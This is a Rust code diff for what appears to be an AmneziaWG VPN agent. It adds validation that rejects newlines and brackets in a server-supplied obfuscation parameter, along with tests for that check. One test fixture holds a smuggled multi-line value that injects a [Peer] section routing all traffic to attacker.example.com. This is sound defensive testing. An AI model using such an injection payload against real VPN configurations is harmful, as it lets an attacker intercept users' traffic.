@@ -76,6 +76,19 @@ fn insert_into_interface(conf: &str, line: &str) -> Result<String> {
 /// All other content ([Peer] sections, PrivateKey, Address, comments,
 /// whitespace) is preserved byte-for-byte.
 pub fn merge_obfuscation_params(conf: &str, params: &AwgParams) -> Result<String> {
+    // SECURITY (T4, crypto_invariant): reject any central-sourced string param
+    // that carries a conf-injection primitive BEFORE it is spliced into
+    // awg0.conf and piped through `awg-quick strip | awg syncconf` (agent.rs
+    // apply path) into the kernel WireGuard peer table. Without this, a hostile
+    // or MITM'd central server could set a multi-line I1 whose embedded
+    // newline + `[Peer]` header injects an attacker peer (AllowedIPs=0.0.0.0/0,
+    // Endpoint=attacker). TLS+bearer authenticates the connection, NOT the
+    // field content — so the guard lives at this splice choke point, the single
+    // path every central-sourced param takes to the kernel. On `Err` the caller
+    // (tick) fails the apply and logs; the Task 12 exporter bumps
+    // `awg_params_agent_param_rejected_total{field="i1"}` (alert critical).
+    params.validate()?;
+
     let replacements: [(&'static str, i64); 10] = [
         ("Jc", params.jc),
         ("Jmin", params.jmin),
@@ -436,6 +449,58 @@ mod tests {
         assert!(
             jc_pos < peer_pos,
             "inserted Jc leaked into [Peer]:\n{}",
+            out
+        );
+    }
+
+    /// FINDING REPRO (crypto_invariant/critical): a multi-line I1 carrying an
+    /// embedded `[Peer]` block MUST be REJECTED at the splice site and NEVER
+    /// reach the conf — otherwise `awg-quick strip | awg syncconf` would install
+    /// an attacker peer (AllowedIPs=0.0.0.0/0, Endpoint=attacker) into the kernel
+    /// WireGuard peer table. Multi-line fixture; current single-line fixtures do
+    /// not cover this. FAILS today (merge splices it and returns Ok).
+    #[test]
+    fn merge_rejects_multiline_i1_peer_injection() {
+        let malicious = "<r 2><b 0x0100>\n\
+                         [Peer]\n\
+                         PublicKey = ATTACKERAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\n\
+                         AllowedIPs = 0.0.0.0/0\n\
+                         Endpoint = attacker.example.com:51820";
+        let params = sample_params_with_i1(11, malicious);
+        let result = merge_obfuscation_params(fixture_conf(), &params);
+        assert!(
+            result.is_err(),
+            "multi-line I1 [Peer] injection must be REJECTED, got Ok:\n{:?}",
+            result
+        );
+    }
+
+    /// Belt-and-suspenders: even a single-line I1 that merely contains a bare
+    /// `[` (section-header primitive) is rejected — no injected content survives
+    /// into an output conf, because merge returns Err before splicing anything.
+    #[test]
+    fn merge_rejects_bracket_in_i1_no_conf_produced() {
+        let params = sample_params_with_i1(11, "<r 2>[Peer]");
+        let result = merge_obfuscation_params(fixture_conf(), &params);
+        assert!(result.is_err(), "bracketed I1 must be rejected");
+        // The original conf's single legit I1 line is the only [Peer]-free
+        // interface content; the malicious value produced no conf at all.
+        assert!(
+            result.err().unwrap().to_string().contains("field=i1"),
+            "rejection must name field=i1 for the Task 12 counter label"
+        );
+    }
+
+    /// Regression: a legit single-line I1 is STILL applied after the guard —
+    /// the charset guard must not reject valid `<r N><b 0xHH>` obfuscation
+    /// params (angle brackets are legit; only `\n\r[]` are forbidden).
+    #[test]
+    fn merge_still_applies_valid_single_line_i1_after_guard() {
+        let params = sample_params_with_i1(11, "<r 3><b 0x0200><b 0x0002>");
+        let out = merge_obfuscation_params(fixture_conf(), &params).unwrap();
+        assert!(
+            out.contains("I1 = <r 3><b 0x0200><b 0x0002>\n"),
+            "valid single-line I1 must still be applied, got:\n{}",
             out
         );
     }
